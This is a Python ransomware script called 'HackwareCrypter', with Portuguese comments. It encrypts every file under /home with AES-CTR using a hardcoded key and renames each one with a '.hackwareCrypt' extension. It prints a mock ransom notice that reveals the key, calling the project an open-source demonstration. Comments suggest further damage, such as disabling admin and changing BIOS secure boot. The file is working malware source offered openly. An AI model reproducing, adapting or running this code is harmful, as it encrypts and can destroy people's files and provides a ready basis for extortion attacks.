#!/usr/bin/python3.6
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import discovery
import hue as Crypter

# ----------------------
# Variáveis Globais
# Altere se necessário
# ----------------------

HARDCODED_KEY = 'yellow submarine'


def get_parser():
    parser = argparse.ArgumentParser(description='HackwareCrypter')
    parser.add_argument(
        '-d', '--decrypt', help='decrypt files [default: no]', action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
            Hackware Strike Force
            ------------------------------------------------------
            Seus Arquivos foram Criptografados. 
            Normalmente esta é a parte em que eu pediria algum resgate pelos seus arquivos
            e caso você concordasse em pagar, eu te enviaria uma chave de desencriptação.
            Entretanto, este é um projeto Open Source para mostrar o quão fácil pode ser 
            escrever um malware.
            Este projeto não tem o objetivo de ser malicioso. A chave de desencriptação
            pode ser encontrada abaixo, sem qualquer custo.
            Por favor, certifique-se de inserí-la exatamente como está escrita, pois você
            corre o risco de perder seus arquivos para sempre.
            Boa Desencriptação, a sua chave de desencriptação é: '{}'
            '''.format(HARDCODED_KEY))
        key = input('Digite a sua Chave > ')

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # Modo de operação do encriptador / decriptador
    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    # altere isto para a sua necessidade
    #init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste/'))
    startdirs = ['/home']

    for currentDir in startdirs:
        for filename in discovery.discover(currentDir):
            Crypter.change_files(filename, cryptFn)
            # Renomeia o arquivo pra indicar a encriptação
            if not decrypt:
                os.rename(filename, filename+'.hackwareCrypt')
            else:
                os.rename(filename, filename.replace('.hackwareCrypt', ''))

    # Limpa a chave de encriptação da Memória
    # para evitar a recuperação através de ferramentas
    for _ in range(100):
        pass

    if not decrypt:
        pass
        # Após a encriptação você pode colocar foto no desktop
        # Alterar icones, desativar admin, bios secure boot, etc


if __name__ == '__main__':
    main()
